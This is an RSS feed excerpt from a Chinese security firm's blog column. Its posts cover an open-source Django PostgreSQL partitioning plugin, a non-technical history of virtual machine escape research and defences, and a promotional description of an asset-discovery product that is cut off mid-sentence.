<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description>安全攻防技术分享</description>
<language>zh-cn</language>
<lastBuildDate>Wed, 20 Feb 2019 02:33:00 +0800</lastBuildDate>
<item>
<title>长亭新年贺礼 | 开源了我们的 Django PostgreSQL 时间分区表插件</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-02-19-57079991.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/57079991&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-84d3108f597c84b858b25d5362f5e7f7_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;什么是分区表，有什么优点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;分区表就是将逻辑上的一个大表分成一些物理上的小表，是数据库系统为大型表的数据组织和管理提供的一种实用的功能特性。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;表分区有很多好处，比如：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;子表可以按照时间等特征去划分&lt;/b&gt;，如果一个查询带有时间范围，那么某些子表可以直接跳过。这样就减少了索引和数据文件的 IO 量，而且这些数据更可能被缓存在内存中了。&lt;/li&gt;&lt;li&gt; 一个子表可以被归档，也就是数据库会忽略它的存在，&lt;b&gt;实现老数据不再查询的特性。&lt;/b&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;如果磁盘空间不足，可以快速删除不想要的数据。&lt;/b&gt;被归档的表的删除和 vacuum 会比较容易，因为需要锁，一直写数据的情况下不容易操作。&lt;/li&gt;&lt;li&gt;&lt;b&gt;如果加一块磁盘扩容，之后创建的新的子表可以单独调整 tablespace 放在新的磁盘上，先不移动已有的数据。&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们为什么要开发这个插件&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里需要先插播一个广告&lt;/p&gt;&lt;p&gt;&lt;b&gt;雷池（SafeLine）是全球首个基于智能语义分析算法的 WAF 产品。&lt;/b&gt;雷池从计算机语言的角度进行攻击检测，区别于传统的基于特征库和黑白名单机制的拦截原理，极大地降低了误报率和漏报率，提升了 WAF 拦截的准确度。面对云端变化，&lt;b&gt;雷池（SafeLine）云端解决方案无论应对私有云、公有云、混合云都有灵活应变的部署防护模式，帮助用户灵活配置网络环境。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;雷池需要不间断地将包括海量攻击检测、行为审计等各类日志入库持久化，给数据库带来了极大的压力。&lt;/p&gt;&lt;p&gt;当然表分区不是存储和处理大数据的最优办法，引入分布式数据库和分布式文件系统才能更好地分离查询和存储压力。但是在某些特定的场景下面（比如你的产品是卖给客户的一台硬件机器）是无法引入分布式系统的。&lt;/p&gt;&lt;p&gt;雷池的后端管理平台基于 Django 框架，而数据库主要使用 PostgreSQL。雷池 S20 系列使用的数据库主版本号为 11，该主版本更新的一大特性便是对表分区进行了若干增强，详情参见 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.postgresql.org/about/news/1894/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;postgresql.org/about/ne&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ws/1894/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;由于 Django ORM 当前不支持声明分区表，所以在此之前也有如 architect (&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/maxtepkeev/architect&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/maxtepkeev/a&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;rchitect&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;) 这样的插件，但是它是基于表继承来实现的，并不支持 PostgreSQL 10 之后的原生分区表功能，而原生分区表功能在性能和易用性上都远远好于表继承。&lt;/p&gt;&lt;p&gt;所以我们开源了基于时间进行原生分区和管理的 Django 插件 django-pg-timepart (&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/django-pg-timepart&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/djan&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;go-pg-timepart&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;)，它支持最新的 PostgreSQL 11，使 Django 能够在业务层对像文章、评论和日志这样的时序数据按一定时间间隔（如年、月、周等）来建立分区。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;如何使用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 Django 中，数据的核心是 model，所以只要给 model 加上我们的 decorator 就可以在 migrate 的时候声明为分区表了。&lt;/p&gt;&lt;p&gt;@TimeRangePartitioningSupport(&quot;timestamp&quot;, default_interval=6)&lt;/p&gt;&lt;p&gt;class AttackLog(models.Model):&lt;/p&gt;&lt;p&gt;    timestamp = models.DateTimeField()&lt;/p&gt;&lt;p&gt;rule_id = models.TextField()&lt;/p&gt;&lt;p&gt;……&lt;/p&gt;&lt;p&gt;但是这个时候只有主表没有子表，需要再去扫描所有的 model 然后创建或者归档子表。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;model.partitioning.create_partition()
model.partitioning.detach_partition()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;雷池的分区自动创建和归档是通过后端的定时器来触发上面的 API 实现的。&lt;/p&gt;&lt;p&gt;当然此归档周期等配置也是可以调整的，而且归档历史和子表信息也可以查询，它们都在 PartitionConfig 和 PartitionLog 中。&lt;/p&gt;&lt;p&gt;此外，我们在业务上给用户提供了修改和查询相关信息的界面，供参考:&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;366&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;366&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2a48e05df464f579c48b9501419a7336_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;410&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;410&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-dd24de751cb6651963fb83cf7d8ef6e6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;最后&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;django-pg-timepart 虽然是一个从实际业务中分离出来的，代码不过千行，功能单一的小插件，但是当开源一个项目的时候，我们也在开源自身对于某些问题的一些想法，并愿意在开源社区中就使用 Django 构建 Web 应用过程中所遇到的问题参与讨论，这才是长亭开源的初衷。&lt;/p&gt;&lt;p&gt;欢迎大家为这一萌芽项目提供更多的建议、指出不足或对功能进行扩展使其更加通用化，Thanks！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;长亭科技同时也是一家长期致力于开源社区的网络安全企业&lt;/b&gt;，其他系列开源工具，了解一下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/passionfruit&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/pass&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ionfruit&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 是 iOS 应用逆向与分析工具，可以大大加速 iOS 应用安全分析过程。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/yanshi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/yans&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 是长亭雷池（SafeLine）下一代 Web 应用防火墙核心引擎使用到的代码生成工具。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;43&quot; data-rawheight=&quot;11&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.jpg&quot; class=&quot;content_image&quot; width=&quot;43&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;43&quot; data-rawheight=&quot;11&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.jpg&quot; class=&quot;content_image lazy&quot; width=&quot;43&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-65b8a7085c6f73ab05ed362a02b486b3_b.gif&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其他相关阅读：&lt;/p&gt;&lt;p&gt;1. &lt;u&gt;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651371841%26idx%3D1%26sn%3D8a59418dc63b146decea7444c64e5a2b%26chksm%3D8d39c8c9ba4e41dfc3b40f301f648e2dd8d71002a266f77678099d5a35aecfbfa5d086d758d8%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《牧云开源的背后》&lt;/a&gt;&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;2. &lt;u&gt;《&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372030%26idx%3D1%26sn%3D682c49b3decda87ddf0ed641d5d347c6%26chksm%3D8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;牧云（CloudWalker）开源手记 | Webshell监控检测策略初探&lt;/a&gt;》&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;3. &lt;u&gt;《&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372090%26idx%3D1%26sn%3D71818ae8fdeaede83b169a1688817cc9%26chksm%3D8d39cbb2ba4e42a4117480f86e4d9beb6b908474a71b76de6d0aef9a066fbf2cbf9277e8650a%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎&lt;/a&gt;》&lt;/u&gt;（点击进入）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;请持续关注，牧云（CloudWalker）新动向即将放出……&lt;/b&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-02-19-57079991</guid>
<pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>逃离云端“母体”——虚拟机逃逸研究进展</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-30-56027433.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/56027433&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ec87a4d9aecce9fb6569a67d9fbcc206_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/9270f5a422a185fe0a6b06d84caefae8&quot; data-hash=&quot;9270f5a422a185fe0a6b06d84caefae8&quot; data-hovercard=&quot;p$b$9270f5a422a185fe0a6b06d84caefae8&quot;&gt;@杨坤&lt;/a&gt; ，长亭科技首席安全研究员&lt;/p&gt;&lt;blockquote&gt;云计算时代已然到来，计算能力已经如同水和电一般，能够被我们随时使用，按需按量使用。依托于公有云设施，你只需轻松点击鼠标，即可购买处理器、内存、硬盘存储、网络带宽等资源，还可以伴随着需求的变化随时灵活调整用量，或增或减。实现这种魔法的核心技术之一正是虚拟化，它是一种能够将单一的硬件资源抽象成可细粒度调配的虚拟硬件资源池的技术。虚拟化技术的诞生极大地提高了计算资源的伸缩性和可管理性。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;什么是虚拟机逃逸？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;越来越多的应用不再直接运行在硬件上，而是运行在虚拟世界——虚拟机上。相对应的，真实世界中的每一台物理机被称为“宿主机”，通过虚拟化技术，它们被抽象成若干台虚拟机，每一台虚拟机之上可以运行不同的应用程序。这时候，为了防止不同虚拟机中运行的应用之间互相干扰，抢占权限，泄露信息，就要求“宿主机”有能力维持虚拟世界的秩序，让虚拟机之间完全隔离，让应用认识到它所存在的虚拟机就是世界的全部，而看不见其他虚拟机的存在。“宿主机”的这种掌控能力，就是虚拟化技术在设计时必须考虑的目标之一，也是云计算安全的基石。&lt;/p&gt;&lt;p&gt;然而虚拟化技术构建的安全屏障并非牢不可破。《黑客帝国》的主人公Neo生存的“母体”就是一个完全虚拟的世界，当他吞下红色药丸，即可完成“母体”的逃离，从而认识真实世界。虚拟化技术在设计或实现中存在的漏洞就是这颗“红色药丸”，虚拟机里运行的程序可以通过漏洞利用，突破禁锢，掌控“宿主机”，实现虚拟机逃逸。&lt;/p&gt;&lt;p&gt;虚拟机逃逸攻击打破了权限与数据隔离的边界，让攻击者从虚拟机里的“普通人类”，一跃成为掌控宿主机的“神”，得以窥探和管控同一片云下成百上千个虚拟机应用和海量数据。不得不说，虚拟机逃逸已成为云计算时代令人闻风丧胆的重大安全威胁之一，这样的攻击能否真的实现？难度究竟有多少？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;过去十年，主流虚拟化技术无一幸免&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;过去的二十年里，虚拟化技术突飞猛进，虚拟化领域的各种流派都得到了极大的发展。在开源领域，KVM占据了主导地位，Xen以将近二十年的历史也占据了一席之地，甲骨文的VirtualBox大多运用在小型测试场景；在商业战场，VMware稳坐领头羊的位置，微软的Hyper-V在其身后不断发起冲击。&lt;/p&gt;&lt;p&gt;而所有的这些主流虚拟化软件，在过去的十年里，面对虚拟化逃逸攻击，无一幸免，让我们一一盘点这些历史上出现过的“红色药丸”。&lt;/p&gt;&lt;p&gt;2009年，Immunity的安全研究员Kostya在BlackHat上演示了VMware Workstation逃逸。研究人员发现了图形显示相关的SVGA设备中的多个漏洞。SVGA模拟设备为虚拟机的2D和3D图像绘制提供了大量命令，由于在这些命令的处理代码中并未做好参数检查，导致攻击者可以利用内存越界访问来实现虚拟机逃逸。&lt;/p&gt;&lt;p&gt;2011年，来自Ksplice的内核工程师Nelson Elhage在BlackHat上演示了KVM逃逸，逃逸中利用了虚拟PIIX4设备中的漏洞。PIIX4是一个主板上的芯片，支持PCI热插拔，由于虚拟设备在代码实现中并未考虑硬件移除时产生的后果，导致出现了一个释放后使用（Use After Free）的问题。&lt;/p&gt;&lt;p&gt;2014年，Francisco Falcon在REcon上演示了VirtualBox逃逸，逃逸中利用了VirtualBox在3D加速功能中出现的内存访问漏洞。&lt;/p&gt;&lt;p&gt;2016年，阿里云安全团队的Shangcong Luan在HITBSec上演示了Xen逃逸。研究人员发现了Xen在虚拟内存管理中出现的一个漏洞，并通过它实现内存的任意读写，最终实现了对宿主机的控制。同年，世界黑客大赛Pwn2Own中首次引入虚拟机逃逸比赛项目，吸引了全球范围内的安全研究人员的关注，并在2017和2018年连续两年均有参赛选手成功挑战VMware Workstation和VirtualBox虚拟机逃逸。&lt;/p&gt;&lt;p&gt;2018年，长亭科技安全研究实验室的f1yyy在GeekPwn上演示了VMware ESXi虚拟机逃逸。VMware ESXi是企业级虚拟化方案的核心系统，防护级别高于桌面版的VMware Workstation，这是全球范围内针对ESXi的首次逃逸。此次逃逸攻击不仅利用了虚拟网卡设备的多个漏洞，也组合了绕过防护策略的技巧，才得以成功。&lt;/p&gt;&lt;p&gt;2018年，微软安全工程师Jordan Rabet在BlackHat上首次演示了Hyper-V逃逸。厂商的员工对自家产品做公开的攻击演示，是非常少见的情形，很好地证明了微软对待安全的积极和开放态度。微软也为虚拟机逃逸漏洞单独设立了丰厚的漏洞奖励计划，开出了最高一个漏洞25万美元的奖励。在这样的激励下，全球的研究人员为HyperV贡献了不少研究成果。&lt;/p&gt;&lt;p&gt;以上列举了过去十年里具有代表性的虚拟机逃逸攻击案例。可以看到，在攻防对抗的研究浪潮里，主流的虚拟化软件KVM、Xen、VMware、VirtualBox、HyperV无一幸免。事实上，除了这些案例，其他被发现和修复的虚拟机逃逸漏洞还有很多很多，数不胜数。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟设备已成重灾区&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;虚拟化技术包含了CPU虚拟化、内存虚拟化、I/O虚拟化等技术。回顾过去十年出现的虚拟机逃逸漏洞，I/O虚拟化技术中的虚拟设备是大部分漏洞产生的根源。&lt;/p&gt;&lt;p&gt;虚拟设备通常解决的是物理设备复用的问题，即如何将有限的硬件外设，例如网卡，抽象成多个网卡，来给不同的虚拟机使用。因此虚拟设备就应当有能力模拟出真实设备的完整功能，要能够为虚拟机提供所有真实设备本应支持的接口，并维护和记录自身状态。遇到需要真实硬件完成的功能时，再由虚拟设备进行传递和调用。&lt;/p&gt;&lt;p&gt;完整模拟硬件设备的功能并非易事，开发者需要遵循相关设备的功能说明书，以实现完整接口，供虚拟机使用。这些功能说明书动辄百页，代码实现复杂度较高。再加上虚拟设备种类繁多，出现编码问题的可能性就更大了。&lt;/p&gt;&lt;p&gt;在VMware多年的安全公告中，虚拟设备漏洞的整体数量占比超过了50%；在2016年的统计中，虚拟设备漏洞比例甚至达到了70%。多年来，Qemu项目中虚拟设备的漏洞数量达到了数百个，同时影响到了基于KVM和Xen的虚拟机。VirtualBox甚至公开警告用户谨慎使用一些虚拟设备，声称其中可能存在较大的安全风险。&lt;/p&gt;&lt;p&gt;所幸大量的研究人员已经将这一问题公开出来，一方面大量的虚拟设备漏洞得到发现和修复，另一方面也给虚拟化技术厂商和社区敲响了警钟。面对虚拟设备这一重灾区，未来是否有行之有效的解决方案？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟机逃逸防护的未来&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;安全的本质是攻防，这句话在几十年的内存漏洞攻防战中得到了完美体现。从1972年美国空军的研究报告中提出“栈溢出”这个概念开始，关于内存破坏类型漏洞的攻防博弈就一直没有停下脚步。攻击者会探索无数精妙的技巧，用千变万化的方式触发漏洞，绕过层层阻碍，实现精巧的内存布局，最终获得程序执行的控制权。而防护者则会思考一些通用方法，在假设漏洞存在的情况下，想尽一切办法阻挠攻击者利用漏洞实现程序控制。这种通用的防御方法我们称为“缓解措施（Mitigation）”。&lt;/p&gt;&lt;p&gt;“栈不可执行”的缓解措施掐断了跳转Shellcode的漏洞利用思路，而倒在了ROP利用技术面前。过去的几十年里，新的缓解措施在不断被提出和应用，增加了攻击者利用漏洞的难度，但是针对性地绕过这些缓解措施的技巧同样也在不断诞生。在这种攻防博弈的过程当中，漏洞利用的难度在不断变大，软件的安全性也得到了不断提升。相比于操作系统刚诞生的年代，如今的攻击者需要越过多重缓解措施的屏障，才能利用漏洞获得程序执行的自由。iOS是利用缓解措施来防止越狱的最佳典范，2018年年末苹果引入的PAC机制将防护级别又一次提升到了顶峰。&lt;/p&gt;&lt;p&gt;虚拟机逃逸同样也是内存破坏漏洞防护和利用的重要战场之一。当前主流的虚拟化技术方案，大多为了性能的考虑，尚未重视缓解措施的使用，例如地址随机性不够、存在可写可执行权限内存等问题依然可以在某些虚拟技术的实现中找到。来自微软的安全工程师Jordan Rabet在2018年的BlackHat大会上也提出了多种利用缓解措施保护Hyper-V的思路。我们相信，在未来，缓解措施必能在虚拟机逃逸防护中发挥积极作用。&lt;/p&gt;&lt;p&gt;软件安全领域，另一种大获成功的防护思路是沙箱。如今，几乎每个浏览器都会启用沙箱机制，便是一个最好的佐证。在引入沙箱之前，任何一个能够控制浏览器执行代码的漏洞都可以一剑封喉，为所欲为——直接获取系统权限。而沙箱，就好比一个牢笼，将攻击者束缚在有限的一片天地，任凭攻击者在牢笼中肆虐，也无碍广阔天地的宁静祥和。本质来说，沙箱机制的基本思路是将被保护对象的权限降到最低，只给保护对象所需的最小权限集合。这种思路能够全面降低保护对象被攻陷后造成的风险，让攻击者即便成功利用了漏洞，能力也是受限的，不足以施展恶意行为。&lt;/p&gt;&lt;p&gt;在沙箱机制的使用上，VMware的ESXi产品走在了前列，VMware将运行虚拟设备的进程通过沙箱保护了起来。长亭科技安全研究实验室在GeekPwn中演示的虚拟机逃逸，额外使用了一个沙箱绕过的漏洞，才得以冲破牢笼，完成逃逸，可见沙箱机制的使用极大地增加了攻击者的难度。微软的Hyper-V目前也启用了沙箱技术保护Worker进程。总的来说，沙箱机制的引入，能够让防守层次化。攻击者只有突破了每一层，才能完成整个攻击；反过来说，任何一个层面缺乏突破手段，完整攻击就无法进行。&lt;/p&gt;&lt;p&gt;基于软件和硬件相结合的缓解措施，以及层层隔离的沙箱机制，或许是虚拟机逃逸防护的未来。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;b&gt;生长有速 万物有度 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;谨以《2018 那些漏洞讲述的事 | 长亭安全漏洞观察年度报告》&lt;/p&gt;&lt;p&gt;献给守护网络安全的Super Heroes&lt;/p&gt;&lt;p&gt;2019，长亭将继续与您同行！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;点击&lt;b&gt;下方链接&lt;/b&gt;下载报告，一起把握网络安全变化的脉搏。&lt;/p&gt;&lt;a data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; href=&quot;http://link.zhihu.com/?target=https%3A//www.chaitin.cn/zh/reports&quot; data-image=&quot;https://pic2.zhimg.com/v2-e8c204d7d6b84e246f9e58451808d409_120x160.jpg&quot; data-image-width=&quot;1241&quot; data-image-height=&quot;1754&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;长亭科技 - 下一代应用安全领导者&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-30-56027433</guid>
<pubDate>Wed, 30 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>洞鉴（X-Ray）手记之三 | 企业级资产管理与风险控制解决方案</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-29-55967856.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/55967856&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2f3154e763c6d2a5d2ea58b88a8049aa_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;多年来，资产发现不全、人工管理效率低、不能及时感知风险等，一直都是企业安全亟待解决的问题。针对这样的企业需求，近年来市面上的资产管理、安全评估类产品层出不穷、数不胜数。但是令企业头疼的问题真正解决了吗？答案是“没有”。&lt;/blockquote&gt;&lt;p&gt;诸如以下问题，依然困扰着企业安全管理者：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;企业资产发现不全&lt;/li&gt;&lt;li&gt;使用 SPA      框架的网站，普通爬虫无法获取资源&lt;/li&gt;&lt;li&gt;企业资产复杂，不好管理&lt;/li&gt;&lt;li&gt;……&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;随着技术领域的日新月异，企业数字化转型所面临的环境越来越复杂，资产管理与风险控制显然已成为企业关注的重点问题。洞鉴（X-Ray）便是在这样的背景下应运而生，希望能够尽一份绵薄之力。那么，洞鉴（X-Ray）在这个复杂的网络空间中，是如何做到有的放矢的呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;资产发现&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;多种方法全面发现资产信息&lt;/b&gt;&lt;/p&gt;&lt;p&gt;面对复杂的场景，洞鉴（X-Ray）针对不同的场景环境，提供了不同的资产发现方法。下面从主动资产发现和被动资产发现两个主要方面展开说明。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;主动资产发现&lt;/li&gt;&lt;ul&gt;&lt;li&gt;域名资产发现&lt;br&gt; 洞鉴（X-Ray）在将爆破、信息资源收集、域传送三种方法智能结合的同时，还加入历史 DNS 查询、根据域名注册人信息反查等方法，扩展性强，使企业按需进行域名资产的发现。&lt;/li&gt;&lt;li&gt;Web 资产发现，分为普通爬虫和模拟浏览器爬虫&lt;br&gt; 普通爬虫，与传统同类产品大同小异，这里重点说下模拟浏览器爬虫。&lt;br&gt; 模拟浏览器爬虫，采取内置浏览器的方式，针对       API 接口、单页应用等获取信息资源困难的情况，比如使用       AngularJS、ReactJS、EmberJS、VueJS       等主流 SPA 框架的网站，对抓取的页面先渲染（执行 Javascript 脚本），然后再对页面内容进行抓取，可以爬取到普通爬虫无法爬取的复杂       Web 资产信息资源，满足企业对       Web 资产全面、准确爬取的需求。&lt;/li&gt;&lt;li&gt;主机资产发现&lt;br&gt; 提供不同深度的主机资产发现模式，满足对特定端口进行定时监控需求。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;被动资产发现&lt;br&gt; 洞鉴（X-Ray）的被动资产发现，从代理、流量、日志三种方式被动地进行资产采集，是对主动资产发现的完美补充。&lt;/li&gt;&lt;ul&gt;&lt;li&gt;基于代理的被动资产发现&lt;br&gt; 通过 HTTP 代理的方式，对关注的资产信息进行定制化采集，既快又准。&lt;/li&gt;&lt;li&gt;基于流量的被动资产发现&lt;br&gt; 通过流量镜像的方式，导入pcap日志或者通过指定网卡实时检测流量，从实时流量中动态获取/更新资产，获取全接口请求，使得资产信息采集达到高的覆盖率。&lt;/li&gt;&lt;li&gt;基于日志的被动资产发现&lt;br&gt; 基于日志的被动资产发现，支持直接导入       syslog 日志或者类似雷池（SafeLine）等 WAF 